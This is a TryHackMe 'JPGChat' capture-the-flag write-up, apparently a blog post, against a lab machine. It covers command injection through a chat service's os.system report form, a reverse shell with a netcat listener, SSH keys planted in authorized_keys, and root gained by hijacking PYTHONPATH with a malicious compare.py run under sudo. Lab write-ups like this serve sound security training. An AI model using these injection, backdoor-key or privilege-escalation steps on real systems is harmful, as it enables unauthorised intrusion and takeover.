@@ -1,0 +1,227 @@
+---
+layout: post
+title:  "TryHackMe - JPGChat"
+date:   2021-02-26 06:49:00 +0100
+categories: [ctf, writeups, tryhackme]
+---
+
+Link to the ctf: [JPGChat](https://tryhackme.com/room/jpgchat)
+
+# Initial foothold.
+This was a little tricky because the service at the port `3000` was not responding properly. So I was stuck with `rustscan`.
+But `nmap` tried several times until the port answered.
+
+```bash
+nmap -sV -sC -p- -T5 -vv -oN nmap.log 10.10.148.90
+```
+
+```
+Warning: 10.10.148.90 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.148.90
+Host is up, received echo-reply ttl 63 (0.077s latency).
+Scanned at 2021-03-01 06:29:57 CET for 298s
+Not shown: 65533 closed ports
+Reason: 65533 resets
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqRxJhw/1rrvXuEkXF+agfTYMZrCisS01Z9EWAv8j6Cxjd00jBeaTGD/OsyuWUGwIqC0duALIIccwQfG2DjyrJCIPYyXyRiTbTSbqe07wX6qnnxV4xBmKdu8SxVlPKqVN36gQtbHWQqk9M45sej0M3Qz2q5ucrQVgWsjxYflYI1GZg7DSuWbI9/GNJPugt96uxupK0pJiJXNG26sM+w0BdF/DHlWFxG0Z+2CMqSlNt4EA2hlgBWKzGxvKbznJsapdtrAvKxBF6WOfz/FdLMQa7f28UOSs2NnUDrpz8Xhdqz2fj8RiV+gnywm8rkIzT8FOcMTGfsvOHoR8lVFvp5mj
+|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2CCqg8ac3eDsePDO27TM9OweWbaqytzrMyj+RbwDCHaAmfvhbA0CqTGdTIBAsVG6ect+OlqwgOvmTewS9ihB8=
+|   256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXcEOgRyLk02uwr8mYrmAmFsUGPSUw1MHEDeH5qmcxv
+3000/tcp open  ppp?    syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     Welcome to JPChat
+|     source code of this service can be found at our admin's github
+|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.80%I=7%D=3/1%Time=603C7CFC%P=x86_64-redhat-linux-gnu%r
+SF:(NULL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\
+SF:x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMES
+SF:SAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(curre
+SF:ntly\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\
+SF:x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(
+SF:GenericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x
+SF:20this\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20gith
+SF:ub\nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20
+SF:\(currently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]
+SF:\x20to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)
+SF:\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar  1 06:34:55 2021 -- 1 IP address (1 host up) scanned in 298.59 seconds
+```
+
+The `3000` port ansers with this message:
+```
+Welcome to JPChat
+the source code of this service can be found at our admin's github
+MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
+REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
+```
+(Let's keep in mind the following sentence: `the source code of this service can be found at our admin's github`)
+
+I thought it was an http service but apparently I had to use `nc` to send commands
+```bash
+nc 10.10.148.90 3000
+```
+![](/assets/Clipboard_2021-03-01-07-06-19.png)
+By writing `[REPORT]` and sending enter, we find one of the admin's name: `Mozzie-jpg`.
+
+![](/assets/Clipboard_2021-03-01-07-06-19.png)
+
+So I headed myself to github and wrote `Mozzie-jpg`
+![](/assets/Clipboard_2021-03-01-07-08-23.png)
+> We're gonna ignore the first result because it's another writeup. :')
+The source code can be found at [https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py](https://github.com/Mozzie-jpg/JPChat/blob/main/jpchat.py)
+
+```python
+#!/usr/bin/env python3
+
+import os
+
+print ('Welcome to JPChat')
+print ('the source code of this service can be found at our admin\'s github')
+
+def report_form():
+
+	print ('this report will be read by Mozzie-jpg')
+	your_name = input('your name:\n')
+	report_text = input('your report:\n')
+	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
+	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
+
+def chatting_service():
+
+	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
+	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
+	message = input('')
+
+	if message == '[REPORT]':
+		report_form()
+	if message == '[MESSAGE]':
+		print ('There are currently 0 other users logged in')
+		while True:
+			message2 = input('[MESSAGE]: ')
+			if message2 == '[REPORT]':
+				report_form()
+
+chatting_service()
+```
+What we notice in particular is the `report_form` function.
+There are two lines where the script calls bash to execute a command.
+```python
+os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
+os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
+```
+Apparently, we can perform an RCE by just injecting our command as `your_name` and/or as `report_text` since those two are input that we can control
+
+We are able to inject our command right where the `%s` stands.
+
+So one thing that we can do is to supply to `echo` a word (even a letter, whatever it is), insert a semicolon, write our payload and then use `#` to comment everything else after our payload.
+So the whole command will look like this: `something; <payload> #`
+
+I used [asio](https://github.com/jackrendor/asio) to generate a reverse shell.
+```bash
+asio -H MY_IP -P 8080 -A -B
+```
+In this way, `asio` generates a one-liner that's gonna try different payloads. 
+
+![](/assets/Clipboard_2021-03-01-07-18-22.png)
+> Indeed, that's a long payload
+
+and we're gonna open up our listener
+```bash
+rlwrap nc -vlp 8080
+```
+
+and then we're gonna insert our payload as we previously discussed.
+![](/assets/Clipboard_2021-03-01-07-21-31.png)
+
+To be sure, I did this for both of `your_name` and `report_text` fields.
+![](/assets/Clipboard_2021-03-01-07-26-28.png)
+And we got our reverese shell.
+If we perform a `whoami`, we can see that we're the user `wes`.
+The next step is to upgrade to a better shell. We can easly create a ssh-key by issuing the following command on our machine:
+
+```bash
+ssh-keygen -t ecdsa -N '' '' -f wes
+```
+
+and put the content of `wes.pub` inside the victim machine in `/home/wes/.ssh/authorized_keys`
+
+if the folder `.ssh` doesn't exist, create it.
+```bash
+echo "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCR/VjkHMmpgmgKeuZrSX10wxCDp9ML34CEqvZjkEcy/5IusFxFpm8ECp2Sn2sPz9a5W6FB0YfvjmJnI2wxvtE= jackrendor" > /home/wes/.ssh/authorized_keys
+```
+
+now we can log in via ssh by issuing the followin command:
+```bash
+ssh -i wes wes@10.10.148.90
+```
+
+# Privilege Escalation
+By issuing `sudo -l` we can see which commands we can execute as root and some other useful information.
+```
+Matching Defaults entries for wes on ubuntu-xenial:
+    mail_badpass, env_keep+=PYTHONPATH
+
+User wes may run the following commands on ubuntu-xenial:
+    (root) SETENV: NOPASSWD: /usr/bin/python3
+        /opt/development/test_module.py
+```
+We can potentially execute the following script: `/opt/development/test_module.py`.
+
+This is the content of the script:
+```python
+#!/usr/bin/env python3
+
+from compare import *
+
+print(compare.Str('hello', 'hello', 'hello'))
+```
+
+Some context here:
+We have `env_keep+=PYTHONPATH` which allows us to add other paths where python can find the libraries.
+
+and the scripts imports `compare` as libary.
+We can create a new script in our home folder called `compare.py`
+
+And then try to mimic the function `compare.Str`.
+In our new libary, we call `os.system` and we try to write our ssh-key to `/root/.ssh/authorized_keys`.
+> NOTE: I'm using the same public key as `wes`, you could create another key if you want to, but I preferred to not to.
+
+```python
+import os
+class compare:
+  def Str(s1, s2, s3):
+    os.system("mkdir /root/.ssh; echo ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCR/VjkHMmpgmgKeuZrSX10wxCDp9ML34CEqvZjkEcy/5IusFxFpm8ECp2Sn2sPz9a5W6FB0YfvjmJnI2wxvtE= jackrendor >> /root/.ssh/authorized_keys")
+```
+Now, we have to change hte `PYTHONPATH` env. In this way, python will look up for the library in our directory.
+```bash
+export PYTHONPATH=$(pwd):$PYTHONPATH
+```
+Now we execute the python script with sudo:
+```bash
+sudo /usr/bin/python3 /opt/development/test_module.py
+```
+We can see some strange output:
+```
+mkdir: cannot create directory ‘/root/.ssh’: File exists
+None
+```
+But it doesn't matter that `mkdir` failed, because it actually wrote the ssh key in the `/root/.ssh/authoridez_keys` because otherwise we would've get another error.
+
+Now, on our machine, we can once again use ssh but this time we're gonna use the username `root`. Same as we did before.
+
+```bash
+ssh -i wes root@10.10.148.90
+```
+
+![](/assets/Clipboard_2021-03-01-08-23-30.png)
